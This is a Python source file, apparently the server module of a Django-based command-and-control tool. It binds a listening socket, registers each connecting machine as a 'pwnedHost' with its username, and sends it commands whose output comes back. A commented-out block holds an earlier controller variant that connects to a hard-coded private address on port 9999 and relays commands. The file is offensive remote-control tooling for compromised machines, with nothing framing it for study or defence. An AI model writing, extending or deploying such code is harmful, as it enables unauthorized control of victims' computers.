import socket
import sys
import time
import threading
from command_control.models import pwnedHost


def create_socket(user, interface, port):
    try:
        global s
        global author
        interface = interface
        port = port
        author = user
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((interface, port))
        s.listen(10)
    except socket.error as error_message:
        print(" Failed to Bind to " + str(interface) + ":" + str(port) + ":" + str(error_message))
        print("Retrying ..!!")
        time.sleep(5)
        create_socket(author, interface, port)


def sock_connect():
    global connect
    global ip_addr
    try:
        connect, ip_addr = s.accept()
        print("connection from %s:%s \n" % (ip_addr[0], ip_addr[1]))
        user = connect.recv(1024)
        host = pwnedHost(author= author, ip=ip_addr[0], port=ip_addr[1], username= user)
        host.save()
    except socket.error as error_message:
        print(" Failed to Connect..!! " + str(error_message))


def command_control(command, ip_address):
    host = pwnedHost.objects.get(ip=ip_address)
    connect.sendto(command.encode(),(host.ip,host.port))
    result = connect.recv(16384)
    return result


"""
import socket
import ssl
from encrypt import *
import pickle


def connect(command_to_run, ip):
    try:
        global host
        global port
        global s
        global sock
        global result
        global command

        command = command_to_run

        host = '172.16.69.132'
        # host = ''
        port = 9999
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # s = ssl.wrap_socket(sock, ssl_version=ssl.PROTOCOL_TLSv1)
        print("Trying to Connect")
        s.connect((host, port))
        print("Connection Established")
        knock = encrypt_message()
        s.send(pickle.dumps(knock))
        time.sleep(1)
        return receive()
    except socket.error as msg:
        return "socket error : " + str(msg[0])


def receive():
    if command == 'quit' or command == 'exit':
        s.close()
    else:
        return send(command)


def send(args):
    s.send(args)
    result = s.recv(16384)
    print(result)
    s.close()
    return str(result)
"""


